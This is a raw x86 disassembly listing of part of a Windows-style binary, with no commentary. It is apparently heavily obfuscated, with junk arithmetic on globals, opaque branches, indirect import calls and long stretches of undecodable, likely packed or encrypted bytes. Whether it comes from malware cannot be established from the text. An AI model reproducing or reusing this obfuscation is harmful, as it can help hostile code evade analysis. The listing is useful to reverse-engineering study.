  402be1:	sub    DWORD PTR ds:0x4284dd,edx
  402be7:	and    edx,DWORD PTR ds:0x428415
  402bed:	mov    edx,DWORD PTR ds:0x428565
  402bf3:	xor    DWORD PTR ds:0x4284b5,edx
  402bf9:	mov    edx,DWORD PTR ds:0x4285a9
  402bff:	mov    edx,DWORD PTR [edx]
  402c01:	xor    DWORD PTR ds:0x428419,edx
  402c07:	and    DWORD PTR ds:0x42833d,0x245f
  402c11:	cmp    DWORD PTR ds:0x428331,0x0
  402c18:	mov    DWORD PTR ds:0x4284d1,0x70c6
  402c22:	not    edx
  402c24:	mov    edx,0x462e
  402c29:	jmp    0x402c95
  402c2e:	mov    DWORD PTR ds:0x428471,edx
  402c34:	cmp    DWORD PTR ds:0x428331,0x0
  402c3b:	jl     0x402c5f
  402c41:	push   DWORD PTR [ebp-0x18]
  402c44:	push   0x2a6e
  402c49:	call   DWORD PTR ds:0x42e240
  402c4f:	sbb    DWORD PTR ds:0x428331,0x59bd
  402c59:	sub    edx,0x641d
  402c5f:	sbb    DWORD PTR ds:0x428339,0x4284f1
  402c69:	sbb    DWORD PTR ds:0x4284d5,0x27b0
  402c73:	mov    edx,DWORD PTR ds:0x42849d
  402c79:	mov    edx,DWORD PTR [edx]
  402c7b:	adc    DWORD PTR ds:0x4283f5,edx
  402c81:	xor    DWORD PTR ds:0x428445,0x428411
  402c8b:	sbb    DWORD PTR ds:0x428461,0x33ea
  402c95:	shr    eax,0x2
  402c98:	cmp    DWORD PTR ds:0x428435,0x0
  402c9f:	mov    DWORD PTR ds:0x428551,0x384
  402ca9:	mov    DWORD PTR ds:0x428335,0x2b95
  402cb3:	mov    edx,DWORD PTR ds:0x428539
  402cb9:	mov    DWORD PTR ds:0x4284f1,edx
  402cbf:	jmp    0x402d0e
  402cc4:	mov    eax,0x220e
  402cc9:	mov    DWORD PTR ds:0x4284dd,0x7b53
  402cd3:	cmp    DWORD PTR ds:0x428435,0x0
  402cda:	jbe    0x402d06
  402ce0:	push   0x3c7e
  402ce5:	push   0x1ff0
  402cea:	call   DWORD PTR ds:0x42e0b0
  402cf0:	sub    edx,0x6132
  402cf6:	sbb    DWORD PTR ds:0x4284f1,0x612a
  402d00:	sbb    DWORD PTR ds:0x428555,ecx
  402d06:	dec    edx
  402d07:	inc    edx
  402d08:	and    edx,DWORD PTR ds:0x428555
  402d0e:	mov    eax,DWORD PTR [ebx]
  402d10:	mov    edx,DWORD PTR [ebx+0x4]
  402d13:	dec    DWORD PTR ds:0x4283f5
  402d19:	xor    ecx,edi
  402d1b:	shl    eax,0x1e
  402d1e:	xor    edx,0x1700
  402d24:	xor    eax,eax
  402d26:	sub    edx,0x11fc
  402d2c:	or     eax,ecx
  402d2e:	mov    ecx,DWORD PTR [ebx]
  402d30:	cmp    DWORD PTR ds:0x4284f1,0x0
  402d37:	mov    DWORD PTR ds:0x428459,0x400c
  402d41:	mov    edx,DWORD PTR ds:0x42841d
  402d47:	mov    edx,DWORD PTR ds:0x4284ed
  402d4d:	jmp    0x402d9d
  402d52:	mov    DWORD PTR ds:0x428441,0x114
  402d5c:	cmp    DWORD PTR ds:0x4284f1,0x0
  402d63:	je     0x402d85
  402d69:	push   DWORD PTR [ebp-0x24]
  402d6c:	call   DWORD PTR ds:0x42e0b4
  402d72:	dec    edx
  402d73:	xor    edx,DWORD PTR ds:0x428549
  402d79:	or     DWORD PTR ds:0x428429,ebx
  402d7f:	sub    DWORD PTR ds:0x4284ed,ecx
  402d85:	mov    edx,DWORD PTR ds:0x42853d
  402d8b:	xor    DWORD PTR ds:0x4284dd,edx
  402d91:	xor    edx,0x442c
  402d97:	not    DWORD PTR ds:0x42832d
  402d9d:	mov    edx,DWORD PTR [ebx+0x4]
  402da0:	add    DWORD PTR ds:0x428429,0x428409
  402daa:	shrd   ecx,edx,0x2
  402dae:	shr    edx,0x2
  402db1:	mov    DWORD PTR [ebp-0x1c],ecx
  402db4:	sbb    edx,DWORD PTR ds:0x4284f1
  402dba:	mov    ecx,DWORD PTR [ebx]
  402dbc:	mov    edx,DWORD PTR ds:0x428471
  402dc2:	xor    DWORD PTR ds:0x4284dd,edx
  402dc8:	mov    edx,DWORD PTR [ebx+0x4]
  402dcb:	xor    DWORD PTR [ebp-0x1c],edi
  402dce:	and    DWORD PTR ds:0x428461,0x4abe
  402dd8:	xor    edx,edx
  402dda:	sub    DWORD PTR ds:0x428401,0x1446
  402de4:	or     edx,DWORD PTR [ebp-0x1c]
  402de7:	shl    ecx,0x1e
  402dea:	lea    ecx,[edx+eax*1]
  402ded:	mov    edx,DWORD PTR ds:0x42851d
  402df3:	xor    eax,eax
  402df5:	xor    eax,DWORD PTR ds:0x4285a9
  402dfb:	sub    edx,eax
  402dfd:	add    edx,DWORD PTR [edx+eax*1]
  402e00:	mov    eax,DWORD PTR [ebx]
  402e02:	xor    DWORD PTR ds:0x428561,ecx
  402e08:	mov    edx,DWORD PTR [ebx+0x4]
  402e0b:	or     DWORD PTR ds:0x4283fd,0x3bc
  402e15:	shrd   eax,edx,0x2
  402e19:	shr    edx,0x2
  402e1c:	cmp    DWORD PTR ds:0x42856d,0x0
  402e23:	mov    DWORD PTR ds:0x42845d,ebx
  402e29:	mov    DWORD PTR ds:0x428461,0x656f
  402e33:	movzx  edx,BYTE PTR ds:0x428409
  402e3a:	jmp    0x402e93
  402e3f:	mov    DWORD PTR ds:0x42842d,0x5c7
  402e49:	mov    DWORD PTR ds:0x42846d,0x3013
  402e53:	cmp    DWORD PTR ds:0x42856d,0x0
  402e5a:	jle    0x402e7f
  402e60:	push   DWORD PTR [ebp-0x24]
  402e63:	call   DWORD PTR ds:0x42e0b8
  402e69:	sub    DWORD PTR ds:0x428341,0x7db0
  402e73:	sub    DWORD PTR ds:0x428571,ecx
  402e79:	adc    DWORD PTR ds:0x4283fd,edx
  402e7f:	and    edx,DWORD PTR ds:0x4284d9
  402e85:	mov    edx,DWORD PTR ds:0x42838d
  402e8b:	mov    edx,DWORD PTR [edx]
  402e8d:	xor    DWORD PTR ds:0x42835d,edx
  402e93:	mov    DWORD PTR [ebp-0x1c],eax
  402e96:	not    DWORD PTR ds:0x428441
  402e9c:	mov    eax,DWORD PTR [ebx]
  402e9e:	add    DWORD PTR ds:0x4284d9,0x4968
  402ea8:	jmp    0x403249
  402ead:	cmp    al,0xdc
  402eaf:	(bad)  
  402eb0:	inc    ebp
  402eb1:	ss dec ebx
  402eb3:	mov    esp,0x8c100abc
  402eb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402eb9:	stos   DWORD PTR es:[di],eax
  402ebb:	clc    
  402ebc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ebd:	mov    ebp,0xbdbebee0
  402ec2:	les    edi,FWORD PTR [esi-0x5cbe4f42]
  402ec8:	xchg   ebx,eax
  402ec9:	retf   
  402eca:	mov    DWORD PTR [ecx-0x3c57113c],esi
  402ed0:	push   ds
  402ed1:	xor    BYTE PTR [edx+0x1a9f4dd0],bh
  402ed7:	idiv   BYTE PTR [edi-0x24]
  402eda:	jle    0x402ede
  402edc:	(bad)  
  402edd:	lea    ecx,[ebx]
  402edf:	mov    cs,WORD PTR [edi+edx*8+0x7d10a4f9]
  402ee6:	aam    0x82
  402ee8:	(bad)  
  402ee9:	push   ss
  402eea:	hlt    
  402eeb:	cdq    
  402eec:	mov    edi,0x4eeea699
  402ef1:	ror    esi,1
  402ef3:	jl     0x402f01
  402ef5:	pop    esi
  402ef6:	xor    eax,0xf3e5d5ab
  402efb:	popa   
  402efc:	pop    edi
  402efd:	inc    esi
  402efe:	cmp    eax,0x3f88fa77
  402f03:	or     al,0xfa
  402f05:	ds ret 0x8486
  402f09:	pop    ecx
  402f0a:	out    0x20,eax
  402f0c:	push   ecx
  402f0d:	popa   
  402f0e:	icebp  
  402f0f:	sbb    DWORD PTR [edx-0x234ed4b7],0xffffffa2
  402f16:	dec    esp
  402f17:	jmp    0xafbd0d9d
  402f1c:	cmp    DWORD PTR [ecx-0x2a45e745],ebx
  402f22:	push   ecx
  402f23:	push   eax
  402f24:	push   cs
  402f25:	inc    ebp
  402f26:	inc    ebx
  402f27:	jp     0x402fa0
  402f29:	std    
  402f2a:	inc    esi
  402f2b:	cmp    ah,cl
  402f2d:	add    dl,cl
  402f2f:	out    0x9c,eax
  402f31:	or     BYTE PTR [ecx+0x36],dl
  402f34:	rcl    DWORD PTR [ebp+0x6ee51907],0xcd
  402f3b:	mov    bh,0xf4
  402f3d:	mov    esi,0x5d3407a4
  402f42:	add    eax,0x65b7192d
  402f47:	ret    
  402f48:	(bad)  
  402f49:	lahf   
  402f4a:	jb     0x402ee7
  402f4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f4d:	outs   dx,DWORD PTR ds:[esi]
  402f4e:	mov    ebx,0x13fc0166
  402f53:	sub    eax,edx
  402f55:	pop    es
  402f56:	ins    BYTE PTR es:[edi],dx
  402f57:	push   cs
  402f58:	add    al,0x56
  402f5a:	dec    esp
  402f5b:	clc    
  402f5c:	inc    esi
  402f5d:	dec    edx
  402f5e:	mov    al,0x4e
  402f60:	xchg   DWORD PTR [esi+0x6e],ecx
  402f63:	sti    
  402f64:	ds test eax,0x2df916b6
  402f6a:	test   al,0x44
  402f6c:	pop    edi
  402f6d:	or     ah,BYTE PTR [ebx-0xc71d87c]
  402f73:	mov    ebp,0x296ba99a
  402f78:	stc    
  402f79:	xor    DWORD PTR [ecx],edi
  402f7b:	inc    eax
  402f7c:	inc    ebp
  402f7d:	pop    edi
  402f7e:	push   ebp
  402f7f:	add    cl,BYTE PTR [ebp+0x3717cfc1]
  402f85:	adc    DWORD PTR [ecx+ecx*2+0x63],edx
  402f89:	or     al,0x33
  402f8b:	mov    ebp,ebp
  402f8d:	test   bl,0x85
  402f90:	mov    ch,0x6
  402f92:	fadd   DWORD PTR ds:0xcef7ccbd
  402f98:	hlt    
  402f99:	ret    0xa92e
  402f9c:	inc    edx
  402f9d:	sub    al,0xb6
  402f9f:	std    
  402fa0:	push   esi
  402fa1:	lods   al,BYTE PTR ds:[esi]
  402fa2:	dec    ebp
  402fa3:	popa   
  402fa4:	push   ebp
  402fa5:	pop    ecx
  402fa6:	push   ss
  402fa7:	cmp    dl,BYTE PTR [esi-0x1a]
  402faa:	out    dx,al
  402fab:	les    ebp,FWORD PTR [edx-0x2e9ac09f]
  402fb1:	fs mov edx,ecx
  402fb4:	push   esp
  402fb5:	mov    eax,0x40c63619
  402fba:	cdq    
  402fbb:	pop    ecx
  402fbc:	(bad)  
  402fbd:	xor    DWORD PTR [esi-0x34],esi
  402fc0:	clc    
  402fc1:	jge    0x402f74
  402fc3:	mov    esp,0x53f946ba
  402fc8:	or     BYTE PTR [edx+0x27933d0d],0xbb
  402fcf:	retf   0x5b40
  402fd2:	iret   
  402fd3:	aam    0x70
  402fd5:	mov    DWORD PTR [ebx],edx
  402fd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fd8:	rcr    edx,0x91
  402fdb:	xchg   BYTE PTR [esi-0x1bbbd602],bh
  402fe1:	stos   BYTE PTR es:[edi],al
  402fe2:	out    0x90,al
  402fe4:	mov    BYTE PTR [ebx],al
  402fe6:	push   0xffffffa2
  402fe8:	mov    bl,0xf1
  402fea:	push   ds
  402feb:	and    al,cl
  402fed:	xchg   DWORD PTR [ebx+0x551283dc],edi
  402ff3:	lock mov al,ds:0x8e94471a
  402ff9:	and    eax,0x281e695c
  402ffe:	mov    edx,0x207378c2
  403003:	xchg   edx,ecx
  403005:	mov    al,0xb9
  403007:	push   ecx
  403008:	xor    dh,dl
  40300a:	jecxz  0x403009
  40300c:	ins    BYTE PTR es:[edi],dx
  40300d:	in     al,dx
  40300e:	pop    ds
  40300f:	fistp  WORD PTR ds:0x154e7151
  403015:	stc    
  403016:	mov    ds:0xfc7b6a8c,al
  40301b:	arpl   WORD PTR [ebp-0x757bf327],di
  403021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403022:	mov    edx,DWORD PTR [edx-0x4f641f22]
  403028:	bound  ebx,QWORD PTR [ecx]
  40302a:	dec    eax
  40302b:	xor    esi,ebx
  40302d:	fist   DWORD PTR [ebx-0x6e]
  403030:	js     0x403010
  403032:	sar    DWORD PTR [eax],0x4
  403035:	jae    0x4030b2
  403037:	pop    es
  403038:	sar    BYTE PTR [eax],1
  40303a:	cdq    
  40303b:	sbb    al,0xd1
  40303d:	jo     0x403037
  40303f:	or     bh,BYTE PTR [ebp-0x52b281fb]
  403045:	xchg   ecx,eax
  403046:	add    eax,0xb819238c
  40304b:	inc    edx
  40304c:	stos   DWORD PTR es:[edi],eax
  40304d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40304e:	mov    esi,0x4082e748
  403053:	sub    BYTE PTR ds:0xf32ea8fc,bl
  403059:	shl    esp,cl
  40305b:	xor    ebp,DWORD PTR [edi]
  40305d:	pop    ds
  40305e:	dec    edx
  40305f:	sbb    DWORD PTR [edx+0x7cd298d6],0x60
  403066:	push   ecx
  403067:	fsub   st,st(0)
  403069:	pop    es
  40306a:	adc    esp,DWORD PTR [edx]
  40306c:	jle    0x403065
  40306e:	or     al,0xcc
  403070:	cmp    DWORD PTR [esi],ecx
  403072:	loop   0x40304b
  403074:	scas   eax,DWORD PTR es:[edi]
  403075:	mov    ds:0x79307fcd,eax
  40307a:	test   eax,0x7f0edba5
  40307f:	out    dx,al
  403080:	adc    cl,BYTE PTR [esi+0x6f576945]
  403086:	mov    cs,WORD PTR [edx]
  403088:	loope  0x403036
  40308a:	lods   al,BYTE PTR ds:[esi]
  40308b:	sar    DWORD PTR [edi-0x49c72e21],cl
  403091:	mov    edx,0xc97b6ba7
  403096:	xlat   BYTE PTR ds:[ebx]
  403097:	lahf   
  403098:	hlt    
  403099:	adc    esi,ebx
  40309b:	rep outs dx,BYTE PTR ds:[esi]
  40309d:	or     eax,0xd715ca46
  4030a2:	(bad)
  4030a5:	mov    ds:0x1119d19,al
  4030aa:	mov    ds:0xa7c08a43,eax
  4030af:	pop    esp
  4030b0:	cmp    BYTE PTR [edx],cl
  4030b2:	scas   al,BYTE PTR es:[edi]
  4030b3:	and    al,BYTE PTR fs:[eax]
  4030b6:	test   eax,0x35009640
  4030bb:	div    dh
  4030bd:	push   edi
  4030be:	jns    0x403073
  4030c0:	mov    cl,0x92
  4030c2:	inc    esp
  4030c3:	cmp    ah,BYTE PTR [ecx+edi*2]
  4030c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030c7:	out    dx,al
  4030c8:	mov    dl,al
  4030ca:	cmp    BYTE PTR [edx],ah
  4030cc:	cmp    bl,BYTE PTR [eax]
  4030ce:	stos   BYTE PTR es:[edi],al
  4030cf:	mov    es,esp
  4030d1:	pushf  
  4030d2:	adc    DWORD PTR [eax+edi*1-0x70],edi
  4030d6:	jecxz  0x403148
  4030d8:	sub    BYTE PTR [edx],bl
  4030da:	jge    0x403082
  4030dc:	push   edi
  4030dd:	xchg   ebp,eax
  4030de:	mov    esi,ecx
  4030e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030e1:	add    ah,bh
  4030e3:	aaa    
  4030e4:	loope  0x40308f
  4030e6:	push   ecx
  4030e7:	cmp    al,BYTE PTR [ebp-0x1e]
  4030ea:	dec    ecx
  4030eb:	(bad)  
  4030ec:	jmp    0x75dc:0x6b13d970
  4030f3:	inc    edi
  4030f4:	mov    bh,0x88
  4030f6:	sub    DWORD PTR [esi],0xefca2fb6
  4030fc:	sbb    BYTE PTR [ebp+0x792aed27],dl
  403102:	pusha  
  403103:	inc    ecx
  403104:	mov    cl,0xcb
  403106:	dec    edx
  403107:	xchg   esi,eax
  403108:	aaa    
  403109:	aas    
  40310a:	rcr    BYTE PTR [esi+0x46],cl
  40310d:	xor    eax,0x56c85ae6
  403112:	sub    al,0xbf
  403114:	mov    ds:0x3c5a307a,eax
  403119:	(bad)  
  40311a:	push   ds
  40311b:	push   edi
  40311c:	in     al,dx
  40311d:	jno    0x403183
  40311f:	inc    ebx
  403120:	(bad)  
  403121:	in     al,dx
  403122:	scas   eax,DWORD PTR es:[edi]
  403123:	sbb    BYTE PTR [ecx+edi*8+0x6cd1128c],cl
  40312a:	jp     0x403168
  40312c:	inc    esi
  40312d:	xor    ch,bl
  40312f:	dec    esi
  403130:	lea    ebx,[edx]
  403132:	sub    al,0xf0
  403134:	cmp    BYTE PTR [edi],ch
  403136:	test   al,0x42
  403138:	popf   
  403139:	push   edx
  40313a:	call   0x2987b286
  40313f:	cli    
  403140:	sbb    esi,ecx
  403142:	inc    ebp
  403143:	jecxz  0x403155
  403145:	fsubr  QWORD PTR [edi]
  403147:	xchg   esp,eax
  403148:	mov    ah,0x2
  40314a:	xchg   esp,eax
  40314b:	push   ds
  40314c:	jp     0x4030fc
  40314e:	stc    
  40314f:	xor    BYTE PTR [ebx],ch
  403151:	jne    0x403159
  403153:	call   0xa321:0x2eafeed1
  40315a:	dec    ebx
  40315b:	jle    0x403130
  40315d:	pushf  
  40315e:	in     eax,dx
  40315f:	mov    ebp,0x3879d8d7
  403164:	and    eax,0xcfcd9a30
  403169:	mov    eax,ds:0x7d4f9590
  40316e:	inc    esp
  40316f:	xor    edx,DWORD PTR [ecx]
  403171:	jle    0x403148
  403173:	(bad)  
  403174:	cld    
  403175:	lods   al,BYTE PTR ds:[esi]
  403176:	sub    al,0xa7
  403178:	cmp    ebx,DWORD PTR [esi-0x3d]
  40317b:	push   0x7d42d756
  403180:	popf   
  403181:	mov    al,ds:0x8f0ca03a
  403186:	shr    BYTE PTR [edi-0x78],1
  403189:	xchg   bl,dh
  40318b:	jecxz  0x40315a
  40318d:	jb     0x40316b
  40318f:	out    0x27,al
  403191:	addr16 mov esi,0x19a1d34
  403197:	sub    BYTE PTR [ebp+0x66],bh
  40319a:	test   DWORD PTR [ebp-0x1a],eax
  40319d:	rcr    BYTE PTR [edi-0x6fd607d4],1
  4031a3:	enter  0x2cbb,0x31
  4031a7:	cs in  eax,0x99
  4031aa:	pop    ds
  4031ab:	in     al,dx
  4031ac:	mov    DWORD PTR [edi-0x67],edx
  4031af:	loopne 0x4031c6
  4031b1:	mov    dh,BYTE PTR [ecx+0x51]
  4031b4:	test   edx,0x4bd41ce6
  4031ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031bb:	pop    ds
  4031bc:	mov    dh,0xf9
  4031be:	test   eax,0x4b34a73b
  4031c3:	loope  0x403162
  4031c5:	ins    DWORD PTR es:[edi],dx
  4031c6:	xor    eax,DWORD PTR [esi-0x4e4f6e65]
  4031cc:	add    eax,0x149589eb
  4031d1:	addr16 push cs
  4031d3:	(bad)  
  4031d4:	retf   0xf71b
  4031d7:	lods   eax,DWORD PTR ds:[esi]
  4031d8:	jl     0x4031ab
  4031da:	scas   eax,DWORD PTR es:[edi]
  4031db:	ds dec edi
  4031dd:	or     ebx,edi
  4031df:	mov    esp,0x7eefff23
  4031e4:	gs ror cl,0x3e
  4031e8:	push   ebx
  4031e9:	jne    0x403234
  4031eb:	and    BYTE PTR [ebx+0x4c],bl
  4031ee:	ret    
  4031ef:	cld    
  4031f0:	leave  
  4031f1:	sbb    dh,ch
  4031f3:	jne    0x40323c
  4031f5:	xchg   ebx,eax
  4031f6:	shr    DWORD PTR [edi+0x5d118114],1
  4031fc:	(bad)  
  4031fd:	gs imul ecx,ecx,0xe74f9e5f
  403204:	(bad)  
  403205:	in     eax,dx
  403206:	ret    
  403207:	cmc    
  403208:	mov    eax,ds:0x4437de5
  40320d:	xchg   ecx,eax
  40320e:	cmp    al,cl
  403210:	and    edx,DWORD PTR [esi+edx*8]
  403213:	out    dx,eax
  403214:	out    dx,eax
  403215:	retf   
  403216:	adc    dh,BYTE PTR [edx+0x56]
  403219:	loop   0x40324b
  40321b:	loopne 0x403225
  40321d:	adc    DWORD PTR [esi],esi
  40321f:	mov    WORD PTR [ecx-0x12],fs
  403222:	icebp  
  403223:	mov    ah,0x8d
  403225:	xchg   ecx,eax
  403226:	add    BYTE PTR [eax+0x67748a60],ch
  40322c:	and    eax,0x5c1f86c8
  403231:	pop    ds
  403232:	sbb    eax,0xc8f7c7c8
  403237:	in     eax,dx
  403238:	push   es
  403239:	xchg   BYTE PTR [ecx+ebx*8+0x3323291],bh
  403240:	fldcw  WORD PTR [ebx+eax*8+0x65]
  403244:	inc    edx
  403245:	cli    
  403246:	jle    0x403224
  403248:	dec    edx
  403249:	mov    edx,DWORD PTR [ebx+0x4]
  40324c:	xor    DWORD PTR [ebp-0x1c],edi
  40324f:	sub    DWORD PTR ds:0x4284c9,ebx
  403255:	mov    edx,eax
  403257:	sub    DWORD PTR ds:0x428569,0x42834d
  403261:	xor    eax,eax
  403263:	or     eax,DWORD PTR [ebp-0x1c]
  403266:	shl    edx,0x1e
  403269:	mov    edx,DWORD PTR ds:0x428449
  40326f:	xor    DWORD PTR ds:0x4283fd,edx
  403275:	imul   eax,ecx
  403278:	sub    DWORD PTR ds:0x4284e9,0x4172
  403282:	mov    ecx,DWORD PTR [ebx]
  403284:	add    edx,0x41d1
  40328a:	mov    edx,DWORD PTR [ebx+0x4]
  40328d:	shrd   ecx,edx,0x2
  403291:	mov    DWORD PTR [ebp-0x1c],ecx
  403294:	mov    ecx,DWORD PTR [ebx]
  403296:	or     DWORD PTR ds:0x4284b9,0x42b9
  4032a0:	xor    DWORD PTR [ebp-0x1c],edi
  4032a3:	mov    DWORD PTR ds:0x428545,0x397a
  4032ad:	shr    edx,0x2
  4032b0:	cmp    DWORD PTR ds:0x42854d,0x0
  4032b7:	mov    DWORD PTR ds:0x4284e1,0x7cee
  4032c1:	mov    edx,DWORD PTR ds:0x4283f5
  4032c7:	jmp    0x403370
  4032cc:	mov    DWORD PTR ds:0x42834d,0x3170
  4032d6:	cmp    DWORD PTR ds:0x42854d,0x0
  4032dd:	jge    0x403302
  4032e3:	push   DWORD PTR [ebp-0x28]
  4032e6:	call   DWORD PTR ds:0x42e244
  4032ec:	add    edx,DWORD PTR ds:0x42840d
  4032f2:	sub    edx,0x765a
  4032f8:	xor    DWORD PTR ds:0x4284c5,0x290
  403302:	sbb    DWORD PTR ds:0x428401,edi
  403308:	inc    edx
  403309:	not    edx
  40330b:	cmp    DWORD PTR ds:0x4284e1,0x0
  403312:	mov    edx,DWORD PTR ds:0x428421
  403318:	mov    DWORD PTR ds:0x4284bd,0x501f
  403322:	mov    edx,DWORD PTR ds:0x4284c1
  403328:	jmp    0x403370
  40332d:	mov    DWORD PTR ds:0x428365,0x1634
  403337:	mov    DWORD PTR ds:0x4284d9,0xaef
  403341:	cmp    DWORD PTR ds:0x4284e1,0x0
  403348:	jb     0x403364
  40334e:	call   DWORD PTR ds:0x42e0bc
  403354:	adc    DWORD PTR ds:0x428421,0x42846d
  40335e:	adc    edx,0x2d88
  403364:	and    edx,0x4ab7
  40336a:	sub    edx,DWORD PTR ds:0x428401
  403370:	mov    edx,DWORD PTR [ebx+0x4]
  403373:	or     edx,DWORD PTR ds:0x4284d9
  403379:	mov    edx,ecx
  40337b:	add    DWORD PTR ds:0x428355,0x4284c9
  403385:	xor    ecx,ecx
  403387:	adc    DWORD PTR ds:0x428325,0x428445
  403391:	or     ecx,DWORD PTR [ebp-0x1c]
  403394:	sub    DWORD PTR ds:0x42843d,0x6b10
  40339e:	shl    edx,0x1e
  4033a1:	add    DWORD PTR ds:0x42832d,ebx
  4033a7:	sub    ecx,eax
  4033a9:	mov    DWORD PTR ds:0x4283f9,0x9e0
  4033b3:	mov    eax,DWORD PTR [ebp-0xc]
  4033b6:	cmp    DWORD PTR [eax],ecx
  4033b8:	mov    DWORD PTR ds:0x428559,0x2658
  4033c2:	mov    eax,DWORD PTR [ebp-0xc]
  4033c5:	mov    ecx,DWORD PTR [ebp+0x18]
  4033c8:	mov    edx,DWORD PTR ds:0x428351
  4033ce:	mov    edx,DWORD PTR [ebp+0x1c]
  4033d1:	jg     0x4038e5
  4033d7:	and    DWORD PTR ds:0x428561,0xf14
  4033e1:	shrd   ecx,edx,0x2
  4033e5:	xor    DWORD PTR ds:0x428429,0x428421
  4033ef:	mov    DWORD PTR [ebp-0x1c],ecx
  4033f2:	xor    DWORD PTR ds:0x428355,edi
  4033f8:	mov    ecx,DWORD PTR [ebp+0x18]
  4033fb:	xor    DWORD PTR [ebp-0x1c],edi
  4033fe:	shl    ecx,0x1e
  403401:	mov    DWORD PTR ds:0x428405,0x71ad
  40340b:	xor    ecx,ecx
  40340d:	or     ecx,DWORD PTR [ebp-0x1c]
  403410:	shr    edx,0x2
  403413:	sub    DWORD PTR ds:0x4284ed,0x3b82
  40341d:	mov    edx,DWORD PTR [ebp+0x1c]
  403420:	cmp    DWORD PTR ds:0x4284c1,0x0
  403427:	mov    DWORD PTR ds:0x428551,0xe2a
  403431:	mov    DWORD PTR ds:0x428339,ecx
  403437:	mov    edx,0x4d53
  40343c:	jmp    0x4034b7
  403441:	mov    DWORD PTR ds:0x428565,0xfd5
  40344b:	mov    DWORD PTR ds:0x428439,ecx
  403451:	cmp    DWORD PTR ds:0x4284c1,0x0
  403458:	jae    0x4034a5
  40345e:	push   DWORD PTR [ebp-0x1c]
  403461:	push   0x633e
  403466:	push   0x428257
  40346b:	push   DWORD PTR [ebp-0x1c]
  40346e:	push   DWORD PTR [ebp-0xc]
  403471:	push   DWORD PTR [ebp-0x20]
  403474:	push   DWORD PTR [ebp-0x24]
  403477:	push   0x6c89
  40347c:	call   DWORD PTR ds:0x42dff4
  403482:	movzx  edx,WORD PTR ds:0x42841d
  403489:	sub    edx,DWORD PTR ds:0x4284d5
  40348f:	mov    DWORD PTR ds:0x42841d,edx
  403495:	mov    DWORD PTR ds:0x428351,0x6c8
  40349f:	sbb    edx,DWORD PTR ds:0x42835d
  4034a5:	mov    edx,DWORD PTR ds:0x42856d
  4034ab:	and    DWORD PTR ds:0x428425,edx
  4034b1:	inc    DWORD PTR ds:0x42831d
  4034b7:	mov    DWORD PTR [ebp-0x2c],ecx
  4034ba:	xor    DWORD PTR ds:0x428335,0x3285
  4034c4:	mov    ecx,DWORD PTR [ebx]
  4034c6:	mov    edx,DWORD PTR [ebx+0x4]
  4034c9:	and    DWORD PTR ds:0x428539,0x4bb1
  4034d3:	shrd   ecx,edx,0x2
  4034d7:	mov    DWORD PTR ds:0x428419,0x325c
  4034e1:	shr    edx,0x2
  4034e4:	add    DWORD PTR ds:0x4284d1,0x68a9
  4034ee:	mov    DWORD PTR [ebp-0x1c],ecx
  4034f1:	sub    DWORD PTR ds:0x428471,ebx
  4034f7:	mov    ecx,DWORD PTR [ebx]
  4034f9:	sub    DWORD PTR ds:0x428459,0x4284dd
  403503:	mov    edx,DWORD PTR [ebx+0x4]
  403506:	xor    DWORD PTR [ebp-0x1c],edi
  403509:	sub    DWORD PTR ds:0x428339,0x428351
  403513:	xor    edx,edx
  403515:	or     edx,DWORD PTR [ebp-0x1c]
  403518:	add    DWORD PTR ds:0x428331,0x71c0
  403522:	shl    ecx,0x1e
  403525:	adc    DWORD PTR ds:0x4284e1,0x428461
  40352f:	imul   edx,DWORD PTR [ebp-0x2c]
  403533:	and    DWORD PTR ds:0x42843d,0x15cd
  40353d:	sub    DWORD PTR [eax],edx
  40353f:	jmp    0x4041b5
  403544:	jmp    0x4038e5
  403549:	pop    ss
  40354a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40354b:	out    0xaf,eax
  40354d:	js     0x4034ff
  40354f:	cwde   
  403550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403551:	retf   
  403552:	mov    ch,0x34
  403554:	fstp   QWORD PTR [ebp-0x79]
  403557:	scas   al,BYTE PTR es:[edi]
  403558:	iret   
  403559:	mov    esi,0xbdbebee8
  40355e:	les    edi,FWORD PTR [esi-0x732d6942]
  403564:	ror    ebp,0x77
  403567:	ds pop ebp
  403569:	mov    bh,0x2e
  40356b:	mov    edx,0xc57dc297
  403570:	idiv   DWORD PTR ds:0x527ad31
  403576:	cmp    eax,0x4ea08bcc
  40357b:	mov    esi,0x15e175c5
  403580:	pop    eax
  403581:	inc    si
  403583:	xlat   BYTE PTR ds:[ebx]
  403584:	adc    ebp,esp
  403586:	ret    
  403587:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403588:	aaa    
  403589:	dec    esi
  40358a:	jge    0x403555
  40358c:	or     eax,0xbbe42f3d
  403591:	in     eax,0x1d
  403593:	xor    esi,DWORD PTR [ecx-0x9c4462c]
  403599:	(bad)  
  40359a:	jecxz  0x403547
  40359c:	mov    cl,dh
  40359e:	cs sub al,0xfa
  4035a1:	adc    esi,DWORD PTR [eax+0x388042b6]
  4035a7:	mov    ch,0xf1
  4035a9:	in     al,0x96
  4035ab:	ins    BYTE PTR es:[edi],dx
  4035ac:	inc    DWORD PTR [esi-0x77ac284f]
  4035b2:	dec    esp
  4035b3:	pop    ebx
  4035b4:	or     bh,0x44
  4035b7:	and    ecx,DWORD PTR [ecx-0x27763f2]
  4035bd:	inc    edx
  4035be:	and    al,0x37
  4035c0:	jbe    0x4035ce
  4035c2:	adc    dl,bh
  4035c4:	jecxz  0x403571
  4035c6:	inc    ecx
  4035c7:	je     0x40361f
  4035c9:	cld    
  4035ca:	push   eax
  4035cb:	sahf   
  4035cc:	jae    0x403635
  4035ce:	cwde   
  4035cf:	dec    edi
  4035d0:	jmp    0x403627
  4035d2:	xor    dh,0xcd
  4035d5:	mov    al,0xa7
  4035d7:	imul   esp,esi,0x5c8bbd0
  4035dd:	xor    BYTE PTR [edi-0x6e02984e],dh
  4035e3:	hlt    
  4035e4:	pop    ecx
  4035e5:	cld    
